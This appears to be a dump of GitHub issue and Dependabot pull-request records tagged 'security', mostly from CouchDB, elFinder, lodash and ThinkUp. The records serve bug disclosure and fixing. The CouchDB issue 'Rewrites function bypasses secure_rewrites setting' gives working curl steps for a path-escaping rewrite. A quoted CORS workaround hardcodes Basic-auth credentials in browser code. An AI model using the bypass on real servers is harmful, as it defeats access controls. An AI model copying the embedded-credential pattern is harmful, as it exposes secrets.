<li><a href=""https://github.com/lodash/lodash/commit/aa816b36d402a1ad9385142ce7188f17dae514fd""><code>aa816b3</code></a> Remove <code>/npm-package</code>.</li>
<li><a href=""https://github.com/lodash/lodash/commit/d7fbc52ee0466a6d248f047b5d5c3e6d1e099056""><code>d7fbc52</code></a> Bump to v4.17.19</li>
<li>Additional commits viewable in <a href=""https://github.com/lodash/lodash/compare/4.17.4...4.17.21"">compare view</a></li>
</ul>
</details>
<details>
<summary>Maintainer changes</summary>
<p>This version was pushed to npm by <a href=""https://www.npmjs.com/~bnjmnt4n"">bnjmnt4n</a>, a new releaser for lodash since your current version.</p>
</details>
<br />


[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=lodash&package-manager=npm_and_yarn&previous-version=4.17.4&new-version=4.17.21)](https://dependabot.com/compatibility-score/?dependency-name=lodash&package-manager=npm_and_yarn&previous-version=4.17.4&new-version=4.17.21)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language
- `@dependabot badge me` will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme

Additionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):
- Update frequency (including time of day and day of week)
- Pull request limits (per update run and/or open at any time)
- Out-of-range updates (receive only lockfile updates, if desired)
- Security updates (receive only security updates, if desired)



</details>",,yes,"dependencies,javascript,security,"
jonphipps/Metadata-Registry,922458524,"[Security] Bump studio-42/elfinder from 2.1.57 to 2.1.59","Bumps [studio-42/elfinder](https://github.com/Studio-42/elFinder) from 2.1.57 to 2.1.59. **This update includes a security fix.**
<details>
<summary>Vulnerabilities fixed</summary>
<p><em>Sourced from <a href=""https://github.com/advisories/GHSA-qm58-cvvm-c5qr"">The GitHub Security Advisory Database</a>.</em></p>
<blockquote>
<p><strong>Unsafe upload filtering leading to remote code execution</strong></p>
<h3>Impact</h3>
<p>Before elFinder 2.1.58, the upload filter did not disallow the upload of <code>.phar</code> files. As several Linux distributions are now shipping Apache configured in a way it will process these files as PHP scripts, attackers could gain arbitrary code execution on the server hosting the PHP connector (even in minimal configuration).</p>
<h3>Patches</h3>
<p>The issue has been addressed with <a href=""https://github.com/Studio-42/elFinder/commit/75ea92decc16a5daf7f618f85dc621d1b534b5e1"">https://github.com/Studio-42/elFinder/commit/75ea92decc16a5daf7f618f85dc621d1b534b5e1</a>, associating <code>.phar</code> files to the right MIME type. Unless explicitly allowed in the configuration, such files cannot be uploaded anymore. This patch is part of the last release of elFinder, 2.1.58.</p>
<h3>Workarounds</h3>
<p>If you can't update to 2.1.58, make sure your connector is not exposed without authentication.</p>
<h3>Important tips</h3>
<p>Server-side scripts can often be created as text files. Currently, elFinder has an appropriate MIME type set for file extensions that are generally runnable on a web server.</p>
<p>However, the server has various settings. In some cases, the executable file may be judged as &quot;text/plain&quot;. Therefore, elFinder installers should understand the extensions that can be executed on the web server where elFinder is installed, and check if there are any missing items in the elFinder settings.</p>
<p>The elFinder PHP connector has an option &quot;additionalMimeMap&quot; that specifies the MIME type for each extension. See <a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3295#issuecomment-853042139"">#3295(comment)</a> for more information.</p>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
<blockquote>
<p>Affected versions: &lt; 2.1.58</p>
</blockquote>
</details>
<details>
<summary>Release notes</summary>
<p><em>Sourced from <a href=""https://github.com/Studio-42/elFinder/releases"">studio-42/elfinder's releases</a>.</em></p>
<blockquote>
<h2>Version 2.1.59</h2>
<h3>Changes form previous version</h3>
<p><a href=""https://github.com/Studio-42/elFinder/blob/master/Changelog"">All previous changes is here.</a></p>
<ul>
<li>[Security:php] Fixed multiple vulnerabilities leading to RCE</li>
<li>[php:session] Fixed <a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3278"">#3278</a> wrong code of typo</li>
<li>[js:core] <a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3351"">#3351</a> allow columnsCustomName[x] to be a function</li>
<li>[css:quicklook] Fixed <a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3240"">#3240</a> remove unnecessary color specifications</li>
<li>[cmd:extract] Fixed <a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3252"">#3252</a> for checking the existence of existing files</li>
<li>[js:core] Fixed <a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3359"">#3359</a> add an option &quot;noResizeBySelf&quot;</li>
<li>[VD:abstract] Fixed <a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3216"">#3216</a> missing url option on upload into root</li>
<li>And some minor bug fixes</li>
</ul>
<h2>Version 2.1.58</h2>
<h3>Changes form previous version</h3>
<p><a href=""https://github.com/Studio-42/elFinder/blob/master/Changelog"">All previous changes is here.</a></p>
<ul>
<li>[VD:abstract] Fixed <a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3151"">#3151</a> support RAR5 lib</li>
<li>[cmd:fullscreen] Fixed <a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3177"">#3177</a> wrong fullscreen button caption</li>
<li>[js:core] Supports cookie samesite attribute</li>
<li>[VD:SFTP] Add new SFTP driver, via phpseclib library</li>
<li>[js:core] Fixed <a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3193"">#3193</a> auto-detection of baseUrl</li>
<li>[js:upload] Fixed upload bug (<a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3264"">#3264</a>)</li>
<li>[VD:abstract,php] make the thumbnail support webp (<a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3265"">#3265</a>)</li>
<li>[php:core] Fixed <a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3250"">#3250</a> error only variables can be passed by reference</li>
<li>[VD:abstract] add 'phar:*' =&gt; 'text/x-php' into 'staticMineMap'</li>
<li>[VD:abstract] Fixed <a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3181"">#3181</a> add an option uploadMaxMkdirs</li>
<li>[php:core] Add cwd param to proc_open (<a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3281"">#3281</a>)</li>
<li>[VD:abstract] Bugfix of an option mimeDetect (<a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3291"">#3291</a>)</li>
<li>[UI] Fixed <a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3302"">#3302</a> problem of d&amp;d when copy of UI command is disabled</li>
<li>And some minor bug fixes</li>
</ul>
</blockquote>
</details>
<details>
<summary>Changelog</summary>
<p><em>Sourced from <a href=""https://github.com/Studio-42/elFinder/blob/master/Changelog"">studio-42/elfinder's changelog</a>.</em></p>
<blockquote>
<p>2021-06-13  Naoki Sawada  <a href=""mailto:hypweb+elfinder@gmail.com"">hypweb+elfinder@gmail.com</a></p>
<ul>
<li>elFinder (2.1.59):
<ul>
<li>[Security:php] Fixed multiple vulnerabilities leading to RCE</li>
<li>[php:session] Fixed <a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3278"">#3278</a> wrong code of typo</li>
<li>[js:core] <a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3351"">#3351</a> allow columnsCustomName[x] to be a function</li>
<li>[css:quicklook] Fixed <a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3240"">#3240</a> remove unnecessary color specifications</li>
<li>[cmd:extract] Fixed <a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3252"">#3252</a> for checking the existence of existing files</li>
<li>[js:core] Fixed <a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3359"">#3359</a> add an option &quot;noResizeBySelf&quot;</li>
<li>[VD:abstract] Fixed <a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3216"">#3216</a> missing url option on upload into root</li>
<li>And some minor bug fixes</li>
</ul>
</li>
</ul>
<p>2021-06-09  Naoki Sawada  <a href=""mailto:hypweb+elfinder@gmail.com"">hypweb+elfinder@gmail.com</a></p>
<ul>
<li>elFinder (2.1.58):
<ul>
<li>[VD:abstract] Fixed <a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3151"">#3151</a> support RAR5 lib</li>
<li>[cmd:fullscreen] Fixed <a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3177"">#3177</a> wrong fullscreen button caption</li>
<li>[js:core] Supports cookie samesite attribute</li>
<li>[VD:SFTP] Add new SFTP driver, via phpseclib library</li>
<li>[js:core] Fixed <a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3193"">#3193</a> auto-detection of baseUrl</li>
<li>[js:upload] Fixed upload bug (<a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3264"">#3264</a>)</li>
<li>[VD:abstract,php] make the thumbnail support webp (<a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3265"">#3265</a>)</li>
<li>[php:core] Fixed <a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3250"">#3250</a> error only variables can be passed by reference</li>
<li>[VD:abstract] add 'phar:*' =&gt; 'text/x-php' into 'staticMineMap'</li>
<li>[VD:abstract] Fixed <a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3181"">#3181</a> add an option uploadMaxMkdirs</li>
<li>[php:core] Add cwd param to proc_open (<a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3281"">#3281</a>)</li>
<li>[VD:abstract] Bugfix of an option mimeDetect (<a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3291"">#3291</a>)</li>
<li>[UI] Fixed <a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3302"">#3302</a> problem of d&amp;d when copy of UI command is disabled</li>
<li>And some minor bug fixes</li>
</ul>
</li>
</ul>
<p>2020-06-05  Naoki Sawada  <a href=""mailto:hypweb+elfinder@gmail.com"">hypweb+elfinder@gmail.com</a></p>
<ul>
<li>elFinder (2.1.57):
<ul>
<li>[js] Fixed <a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3148"">#3148</a> to support jQuery 3.5.0 update</li>
<li>[php:core] Fixed <a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3154"">#3154</a> volume that require online access cannot be specified</li>
<li>[VD:abstract] Fixed <a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3161"">#3161</a> fix option data of cwd results on after change files</li>
<li>[VD:abstract] Fixed <a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3167"">#3167</a> added &quot;none&quot; (no image library check) to <code>imgLib</code></li>
<li>[cmd:resize] Fixed <a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3158"">#3158</a> to make able to change quality without changing dimensions</li>
<li>And some minor bug fixes</li>
</ul>
</li>
</ul>
<p>2020-04-09  Naoki Sawada  <a href=""mailto:hypweb+elfinder@gmail.com"">hypweb+elfinder@gmail.com</a></p>
<ul>
<li>elFinder (2.1.56):
<ul>
<li>[js:extras:editors.default] remove Pixlr editor it is no longer possible to display in IFRAME</li>
<li>[php:core] Fixed <a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3134"">#3134</a> close file pointer before deleting temporary file on shutdown</li>
<li>[VD:abstract] change prefix of zipdl temp file</li>
<li>[php:core] Fixed <a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3136"">#3136</a> zipdl fails on Chrome on iOS / iPadOS</li>
<li>[cmd:netmount] Fixed <a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3138"">#3138</a> OAuth not possible with CORS due to new ITP</li>
<li>[VD:MySQL,OneDrive] Fixed <a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3142"">#3142</a> remove debug code</li>
<li>[i18n:pl,ko] Updated translations</li>
</ul>
</li>
</ul>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/Studio-42/elFinder/commit/06ada3132cefd057e1d89cb016f8c82473d420d4""><code>06ada31</code></a> release elFinder version 2.1.59</li>
<li><a href=""https://github.com/Studio-42/elFinder/commit/33b70254c7e9da9b1c6658bd0fbae14ab807157e""><code>33b7025</code></a> src build elFinder-2.1-c921a71</li>
<li><a href=""https://github.com/Studio-42/elFinder/commit/568d3e765ace6922657730f4dfc5aaaf5fa952e7""><code>568d3e7</code></a> src build elFinder-2.1-28ea040</li>
<li><a href=""https://github.com/Studio-42/elFinder/commit/083cb0884db93f208e4e3937af28d380e8791596""><code>083cb08</code></a> release elFinder version 2.1.59</li>
<li><a href=""https://github.com/Studio-42/elFinder/commit/f4f7cd2deee0d39e6808426648b8c7e29be13cf9""><code>f4f7cd2</code></a> src build elFinder-2.1-cb8c1e8</li>
<li><a href=""https://github.com/Studio-42/elFinder/commit/07ab6a64dd4461626274e5f6c6eeb8ae18020d98""><code>07ab6a6</code></a> merge master README.md</li>
<li><a href=""https://github.com/Studio-42/elFinder/commit/34caa9e0fc091d38ad10aeadb49bc1a0112bc343""><code>34caa9e</code></a> src build elFinder-2.1-6218e9b</li>
<li><a href=""https://github.com/Studio-42/elFinder/commit/395b806521cfe58577408ef860e2a8bd0270dcf9""><code>395b806</code></a> src build elFinder-2.1-90be103</li>
<li><a href=""https://github.com/Studio-42/elFinder/commit/04fa60cbed19a18204ffd39a6eaacdec051514f6""><code>04fa60c</code></a> src build elFinder-2.1-185ac78</li>
<li><a href=""https://github.com/Studio-42/elFinder/commit/3802892cf32e999f08143107c5686e84ce837164""><code>3802892</code></a> release elFinder version 2.1.58</li>
<li>Additional commits viewable in <a href=""https://github.com/Studio-42/elFinder/compare/2.1.57...2.1.59"">compare view</a></li>
</ul>
</details>
<br />


[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=studio-42/elfinder&package-manager=composer&previous-version=2.1.57&new-version=2.1.59)](https://dependabot.com/compatibility-score/?dependency-name=studio-42/elfinder&package-manager=composer&previous-version=2.1.57&new-version=2.1.59)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

**Note:** This repo was added to Dependabot recently, so you'll receive a maximum of 5 PRs for your first few update runs. Once an update run creates fewer than 5 PRs we'll remove that limit.

You can always request more updates by clicking `Bump now` in your [Dependabot dashboard](https://app.dependabot.com).

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language
- `@dependabot badge me` will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme

Additionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):
- Update frequency (including time of day and day of week)
- Pull request limits (per update run and/or open at any time)
- Out-of-range updates (receive only lockfile updates, if desired)
- Security updates (receive only security updates, if desired)



</details>",,yes,"dependencies,security,php,"
apache/couchdb,348396049,"Multi-tenancy support","Cloudant has this. Would be great if open source CouchDB had this too.

Depends on #1504 .","I have a node.js based proxy prototype of this (closed source at the moment) that could help with inspiration. I might be able to share its test suite in the future.I have used Couchdb in past as a secondary database in SaaS apps it was never my main storage.
I'm not sure if I really need multi-tenancy builtin, because it would increase the docs complexity. 

But I would love to see the proxy @janl  mentioned, actually I'm planing to port an tenant handler we have from PHP to node.js and open source it (it's actually for mysql but I can create wrapper for other database).

Can you share something about the common strategies  used? one database per tenant or all data in a single database and proxy controls what each tenant can see?




@manobi you may also want to look at the _access proposal for CouchDB 3.0, which helps with the latter scenario. I think this might be better for your situation, frankly. See #1524 for details.@wohali Thanks for sharing, I will be following your recommendation.",no,"api,security,feature,roadmap,"
apache/couchdb,351188480,"Provide configuration option enforcing AuthSession cookies' ""Secure"" attribute in couch_httpd_auth","<!--- Provide a general summary of the issue in the Title above -->

## Expected Behavior
<!--- If you're describing a bug, tell us what should happen -->
<!--- If you're suggesting a change/improvement, tell us how it should work -->
I propose adding a new configuration option to `couch_httpd_auth` to unconditionally enforce the [`Secure`](https://tools.ietf.org/html/rfc2109.html#section-4.2.2) attribute for `AuthSession` cookies created via `/_session` API.

The new option would be Boolean, with a default value of `false`.

Enabling this option would force inclusion of the `Secure` cookie attribute for all `set-cookie` authentication response headers, with no respect to configuration elsewhere (e.g. in `[ssl]`).

## Current Behavior
<!--- If describing a bug, tell us what happens instead of the expected behavior -->
<!--- If suggesting a change/improvement, explain the difference from current behavior -->
CouchDB only adds the `Secure` attribute to `set-cookie` response headers when CouchDB's built-in SSL is enabled. 

For stacks with SSL-terminating reverse-proxies or load-balancers (i.e. secure setups _not_ utilizing CouchDB's built-in SSL on the backend), this is a potential user authentication security vulnerability as the absence of the `Secure` cookie attribute allows browsers to transmit `AuthSession` cookies in clear text over insecure connections.

## Possible Solution
<!--- Not obligatory, but suggest a fix/reason for the bug, -->
<!--- or ideas how to implement the addition or change -->

In `default.ini`:

```ini
[couch_httpd_auth]
; alternative option names: cookies_always_secure, secure_cookies_only 
force_secure_cookies = false ; default setting

``` 

Excusing my unfamiliarity with Erlang...

In [/src/couch/src/couch_httpd_auth.erl](https://github.com/apache/couchdb/blob/7597abf850870bb63e115ec004106b403a9be42c/src/couch/src/couch_httpd_auth.erl#L428):
```erlang
cookie_scheme(#httpd{mochi_req=MochiReq}) ->
    [{http_only, true}] ++
    % Check the configuration value here, first.
    % If configured as true, assign [{secure, true}] and return
    % Else, continue to case below
    case MochiReq:get(scheme) of
        http -> [];
        https -> [{secure, true}]
    end.
```
## Steps to Reproduce (for bugs)
<!--- Provide a link to a live example, or an unambiguous set of steps to -->
<!--- reproduce this bug. Include code to reproduce, if relevant -->
N/A

## Context
<!--- How has this issue affected you? What are you trying to accomplish? -->
<!--- Providing context helps us come up with a solution that is most useful in the real world -->
IMO there's also a good argument for defaulting this option to `true`:

If `AuthSession` cookies are `Secure` by default, frontend developers will see errors in the browser when attempting to transmit the cookie insecurely, and must actively change the configuration to allow transmission over http. Conversely, browsers happily send `AuthSession` cookies in the clear if no `Secure` attribute is present, which can easily go unnoticed ðŸ™ˆ

## Your Environment
<!--- Include as many relevant details about the environment you experienced the bug in -->
* Version used: 2.2.0
* Browser Name and version: All
* Operating System and version (desktop or mobile): All
* Link to your project: N/A
","I think the concern here is: how many programmatic clients would such a change break? I see your point on browsers, but to be honest, most CouchDB access ""in the field"" is via language-native clients.

If this would break the large majority of them (and I expect it would), I would be -1 on this change.@wohali thanks as always for your insight:

> ... how many programmatic clients would such a change break? ... most CouchDB access ""in the field"" is via language-native clients.

Interesting! For clarity, you're implying that most programmatic clients rely on `/_session` cookies for authentication? [pouchdb-authentication](https://www.npmjs.com/package/pouchdb-authentication) as a purely front-end `/_session` interface, for example, averages ~750 installs per week. Is that indeed trivial compared to these programmatic clients?


> If this would break the large majority of them (and I expect it would) ...

That's why I propose this be **disabled by default** i.e. purely opt-in.
 
Perhaps a broader discussion on bringing `/_session` cookies up to a modern spec would be more appropriate, first? [RFC 2109](https://tools.ietf.org/html/rfc2109.html) reached legal US drinking age this year! ðŸ»The project I'm working on is being affected by the enforcement of SameSite=none and Secure being needed for _session cookies.  While Couchdb 3 (which we will be trying out soon) does add the SameSite attribute, the Secure attribute is still missing since we are using a reverse proxy to securely access our databases (as direct SSL is unreliable).  Could this please be addressed as it would be difficult to reliably intercept responses on our proxy and alter the cookie header manually.@thebigh2014 adding a `Secure` attribute is a pretty standard thing in most reverse proxies. What proxy are you using?@willholley We've been using [Redbird](https://github.com/OptimalBits/redbird/) but since it doesn't provide built-in support for modifying response headers, I'm going to be trying Apache reverse proxy (since Apache is already running for other things on our server).  Thanks for your reply.",no,"security,enhancement,"
apache/couchdb,350558775,"Prevent modification of /_users/_security object with opt-out ini file setting","
## Expected Behavior
Modifying the `_security` object inside of `_users` is unsupported, and can lead to some unusual behaviour - see #1556.

## Current Behavior
We allow people to shoot themselves in the foot by modifying `_users/_security`.

## Possible Solution
Always return a `403` on write attempts for `_users/_security`. @rnewson do you have any comment on this?

## Steps to Reproduce (for bugs)
1. `dev/run -n 1 --with-admin-party-please`
2. `curl -X PUT http://localhost:15984/_users/_security -d '{""foo"": ""bar""}'

## Context
People are trying to change the rules for who can read/write documents in `_users` and it goes very badly.

## Your Environment
* Version used: 2.2.0
","It's a difficult thing to remove at this late stage, though I agree with the proposal.

Should we fold this into the broader push to hide these databases behind an API that enforces only the semantics we wish?@rnewson If a naive block is a problem for 2.x, we can just say this is backwards-incompatible and fold it into #1504 if you want, sure. I just thought maybe a 2.3 that blocked `_users/_security` writes wouldn't be too hard to implement, and shouldn't affect TOO many people...It's hard to know how many have changed the security object of _users. Those that have done so and _not_ encountered a problem will be broken by this change; those that _have_ encountered a problem will have had to reverse their change already.

I think we should save the breakingchangeness until we present a full replacement for this; the API that sits in front of this database and only permits what it ought to.
+1, let's leave this unti #1504. I'll close this for now.Alternatively, like we've done with default db security and making _all_dbs an opt-in config value could help folks until we have a proper fix. yes, I can see that. [couchdb] users_db_security_editable=false|true or something, defaulting to false in the new default.iniIf we're OK with that alternative for 2.x, I'll re-open this.",no,"bug,security,beginner-friendly,"
apache/couchdb,567259808,"Cross Origin configuration not working","[NOTE]: # ( ^^ Provide a general summary of the issue in the title above. ^^ )

## Description

I'm attempting to use CouchDB directly from a browser-based application.  I have configured CORs as directed in the documentation, and via the Fauxton Administrative interface, verified it is enabled.  However, when I run an XMLHttpRequest in Chrome, it fails with a denial saying that ""Http did not return with status code 200"".  

When running an ""OPTIONS"" request with curl, it also fails with 
```{""error"":""method_not_allowed"",""reason"":""Only DELETE,GET,HEAD,POST allowed""}```


## Steps to Reproduce

[NOTE]: # ( Include commands to reproduce, if possible. curl is preferred. )

## Expected Behaviour

After configuring CORs configuration, OPTIONS request respond correctly with appropriate headers.

## Your Environment


* CouchDB version used: 2.3
* Browser name and version: Chrome  80.0.3987.116
* Operating system and version: Fedora 31

## Additional Context


","Looks like a reprise of https://issues.apache.org/jira/browse/COUCHDB-2027 .Is this a useful workaround for you?

> My problem was solved by:
> 
> 1. adding headers= accept, authorization, content-type, origin into [cors] section of local.ini // the docs were not clear to me about this
> 2. Adding an Authorization header in my AJAX request :

```javascript
$.ajax({
type: ""GET"",
contentType: ""application/json"",
dataType: ""json"",
url: myUrl
beforeSend: setHeader,
error: function (error)
{ console.log(error); }

,
success: function (remoteAppInfo)
{ ... }

});

function setHeader(xhr)
{ console.log(""setHeader""); xhr.setRequestHeader('Authorization',""Basic "" + btoa(""estanteuser:Dnbatfydnkwadm6f"")); } 
```Also see https://github.com/pouchdb/add-cors-to-couchdb",no,"api,bug,security,"
apache/couchdb,348339395,"Redesign CouchDB security system","@janl:
>
> * closed by default
> * more fine-grained permissions
> * more options for delegated authentication
>
> Our security system is slowly grown and not coherently designed. We should start over. I have many ideas and opinions, but they are out of scope for this. I think everybody here agrees that we can do better. This *very likely* will *not* include per-document ACLs as per the often stated issues with that approach in our data model.

@davisp:
>Big +1 on this. The auth stuff in our code base is hard to follow and difficult to hold in my brain. Taking a step back to redesign from the ground up would be super awesome.","It would be good to see a clearly defined security layer cut through the database horizontally in any refactoring / building from scratch (e.g., sitting above fabric, so anything below fabric can assume authorised). This would also help a lot with any efforts to separate out different database subsystems, if, e.g., the whole storage subsystem doesn't have to care about users, roles etc.Some links:

@rnewson today mentioned implementing [XACML](https://en.wikipedia.org/wiki/XACML) at IBM/Cloudant to replace the current roles system, and I don't see any reason we couldn't consider mirroring this framework, if not the implementation. (Eew, XML.) Robert is going to ask @kocolosk how much of the IBM implementation he can discuss in public. In short, their model doesn't have the PDP layer inside of Couch; if we took the same approach, we'd have to build a PDP inside of Couch, which could consult whatever source of information it wanted. This might or might not include such things as `_security` objects, depending on how we wish to implement things.

The thought occurred to me that web-of-trust systems might be useful in this space as well, since it was mentioned on the Wikipedia page for XACML. It'd be especially interesting from a CouchDB replication trust model as well. I think this might be a separate ticket, however. Upcoming (but not yet widespread) standards in this space include DID and OCAP-LD from the W3C.Mostly, for me, there are a few things that [our IAM implementation](https://console.bluemix.net/docs/services/Cloudant/guides/iam.html) does which would be really nice:

- Convert a request (based on request path) to a symbolic action name which can then be used for authz and for request dispatching within the system (rather than having various places parsing URL paths etc.). E.g., `couchdb.db.read-document`.
- There is a flexible actions to roles mapping that can be set up by an admin -- so we'd be able to allow a couch admin to create and ""operator"" role and specify what that role has access to (e.g., the various `_info` endpoints, things under `/_admin` and so on).
- Likely the `_security` doc format needs to be altered to allow for a more flexible role/user/group mappings.

I like the idea of chttpd converting the HTTP request into some kind of object that's specific to the request being made, like a view request, and validating all the parameters when creating that request-specific object, rather than passing down the HTTP request itself. I think this would be needed to really have a solid security split, as the lower levels could assume both the request is allowed and that the data can be trusted.",no,"security,enhancement,roadmap,"
apache/couchdb,404139990,"Rewrites function bypasses secure_rewrites setting","## Description

Using a rewrites function allows you to access other paths that secure_rewrites usually blocks.

## Steps to Reproduce

```
~$ curl -X PUT 'http://127.0.0.1:5984/r'
{""ok"":true}

~$ curl -X PUT 'http://127.0.0.1:5984/r/_design/n' -d $'{""rewrites"": ""function (r) { return { path:\'../../../\' + r.path.slice(4).join(\'/\') } } ""}'
{""ok"":true,""id"":""_design/n"",""rev"":""1-08f4fea4ee5b841159d913a4aa25d6c7""}

~$ curl 'http://127.0.0.1:5984/r/_design/n/_rewrite/_uuids'
{""uuids"":[""6c59d2b3e582f05f7589fc2cef0a49c4""]}
```

## Expected Behaviour

The final curl above should have returned ""insecure_rewrite_rule"" since it allowed access to the root even though secure_rewrites is turned on.  That is what happens for rewrite rules like:

```
~$ curl -X PUT 'http://127.0.0.1:5984/r/_design/m' -d $'{""rewrites"": [{""from"": ""*"", ""to"": ""../../../*""}] }'
{""ok"":true,""id"":""_design/m"",""rev"":""1-6c7cb91e520f4bc9cfe7f33790336159""}

~$ curl 'http://127.0.0.1:5984/r/_design/m/_rewrite/_uuids'
{""error"":""insecure_rewrite_rule"",""reason"":""too many ../.. segments""}
```

## Your Environment

```
~$ curl http://127.0.0.1:5984
{""couchdb"":""Welcome"",""version"":""2.3.0"",""git_sha"":""07ea0c7"",""uuid"":""e07d95a0b0610b7bcb8e046fff5dd1b6"",""features"":[""pluggable-storage-engines"",""scheduler""],""vendor"":{""name"":""The Apache Software Foundation""}}
```
","Can you confirm that you have `[httpd] secure_rewrites = true`? Thanks.We do have a test for something similar, but it doesn't use wildcards.

https://github.com/apache/couchdb/blob/103a0624f309ea0d796176a55eb5faea68f26047/test/javascript/tests/rewrite.js#L418-L442Yes, this repros with secure_rewrites set to true. You can see the error returned by an insecure rewrite rule under the Expected Behavior section.",no,"bug,security,"
ThinkUpLLC/ThinkUp,2288677,"Enable version check to be done using https","When accessing thinkup over HTTPS the app will still to a HTTP request to check the latest version. This will cause an error at least in Chrome because insecure content is being loaded.

It seems like the current site isn't available over HTTPS so I guess there is more to it than just updating the code. 
","Acknowledged. We have to make thinkup.com available over SSL or not, then call it using protocol-inspecific // instead of http or https. Thanks.
Just checked back on old issues I've created and looking at 2.0 beta 8 I can't find this feature any more, is this issue even relevant? 
Yes, this is still a problem in the current version, so we can keep this ticket open.
",no,"security,"
ThinkUpLLC/ThinkUp,1655720,"Encrypt owner-specific OAuth tokens and application API keys","OAuth tokens and API keys allow an application to act on behalf of the user on a third-party service, so applications should protect those tokens with the same measures they protect the user's password. ThinkUp should hash OAuth tokens which give users access to third-party services instead of storing them in the database as cleartext.

This goes for owner-specific OAuth tokens for Facebook and Twitter stored in owner_instances, as well as application-wide API keys stored in tu_options.

